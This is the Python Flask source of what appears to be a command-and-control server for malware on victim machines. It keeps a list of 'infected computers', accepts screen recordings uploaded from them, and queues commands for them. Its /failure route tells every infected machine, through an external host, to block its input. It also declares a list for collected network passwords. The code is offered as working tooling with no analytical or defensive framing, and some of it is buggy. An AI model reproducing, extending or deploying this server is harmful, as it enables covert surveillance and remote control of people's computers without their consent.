from flask import Flask, send_file, request, redirect, url_for, jsonify
import os, json, uuid, requests, shutil
from flask_cors import CORS
from time import time

app = Flask(__name__)
CORS(app, supports_credentials=True)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SAVE_DIR = os.path.join(BASE_DIR, 'screen_recordings')
SESSION_DURATION = 3600

messages = []
session = {}
screen_recordings = []
infected_computers = []
all_network_passwords = []

def create_session():
    global session
    session_id = str(uuid.uuid4())
    session = {
        "sessionid": session_id,
        "expires_at": time() + SESSION_DURATION
    }
    print(f"New session: {session.get('sessionid')} expiring in {session.get('expires_at')}")
    return session_id

def remaining_time():
    return max(0, int(session.get('expires_at') - time()))

def delete_all_computers():
    global infected_computers
    print('Cleared computer list.')
    infected_computers = []

def remove_computer(computer_name):
    global infected_computers
    if computer_name in infected_computers:
        infected_computers.remove(computer_name)
        print(f'Removed computer: {computer_name}')
    else:
        print(f'Computer {computer_name} not found in the list.')

@app.route('/', methods=['GET', 'POST'])
def home():
    return send_file('templates/index.html')
    
@app.route('/jumpscare')
def flash_page():
    return send_file('templates/jumpscare.html')

@app.route('/neutral')
def neutral_page():
    return send_file('templates/neutral.html')

@app.route('/success')
def success():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'hidewbcl-{computer}'})
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    for computer in infected_computers:
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'blockinput-{computer}'})
        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': f'hidewbcl-{computer}'})
    return send_file('templates/failure.html')

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

@app.route('/messages', methods=['POST', 'GET'])
def handle_messages():
    if request.method == 'POST': 
        if 'video' in request.files and 'filename' in request.form:
            video = request.files['video']
            filename = request.form['filename']

            filepath = os.path.join(SAVE_DIR, filename)
            video.save(filepath)
            screen_recordings.append(filename)

            requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'screen-recording-ready'})
            print("Saved:", filepath)
            return jsonify({'status': 'saved', 'filename': filename})

        message = request.get_json(force=True, silent=True)
        action = message.get('action', '')
        data_value = message.get('data', '')

        if 'ping' in data_value:
            return jsonify({'data': 'pong'})
        elif 'delete_all_computers' in action:
            delete_all_computers()
            return jsonify({'status': 'success'})
        elif message.get('computer_name'):
            computer = message['computer_name'].upper()
            if computer not in infected_computers:
                infected_computers.append(computer)
                print('New Computer:', computer)
            return jsonify({'status': 'success'})
        elif message.get('all_computers'):
            print('Computers Requested, returning:', infected_computers)
            return jsonify(infected_computers)
        elif action.startswith('remove-computer-'):
            computer = action.replace('remove-computer-', '')
            remove_computer(computer)
            return jsonify({'status': 'success'})
        elif action == 'delete-videos':
            shutil.rmtree(screen_recordings)
            os.makedirs(screen_recordings)
            requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'action': 'delete-video'})
            return {'status': 'no-files-found'}
        elif message.get('verify_creds'):
            creds = message['verify_creds']
            username = creds.get('username')
            password = creds.get('password')
            valid_username = 'mngr'
            password_file = '/root/.config/code-server/config.yaml'

            with open(password_file, 'r') as f:
                for i, line in enumerate(f):
                    if i == 2:
                        valid_password = line.strip().replace('password: ', '').replace("'", "")

            if username == valid_username and password == valid_password:
                session_id = create_session()
                return jsonify({
                    "sessionid": session_id,
                    "expires_in": SESSION_DURATION
                })
            else:
                return jsonify({'status': 'incorrect'}), 401
        elif message.get('check_session'):
            if session:
                print(f'Session id {session.get('sessionid')} requested with expiry {remaining_time()}')
                return jsonify({
                    'sessionid': session.get('sessionid'),
                    'remaining': remaining_time()
                })
            else:
                return jsonify({'status': 'no-session'})
        elif action.startswith('collect-recorded-'):
            computer = action.replace('collect-recorded-', '')
            requested_time = message.get('time', '')
            filename = f"screen-recording-{computer}-{requested_time}.mp4"
            filepath = os.path.join(SAVE_DIR, filename)
            
            if not os.path.exists(filepath):
                return jsonify({'error': 'Recording not found'}), 404

            return send_file(filepath, mimetype='video/mp4', as_attachment=False)

        messages.append(message)
        print(f'Stored messages: {message}')
        return jsonify({'status': 'success'})
    elif request.method == 'GET':
        out = messages.copy()
        if out == '[]':
            print(f'Message fetched: {out}')
        messages.clear()
        return jsonify(out)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8003, debug=True)
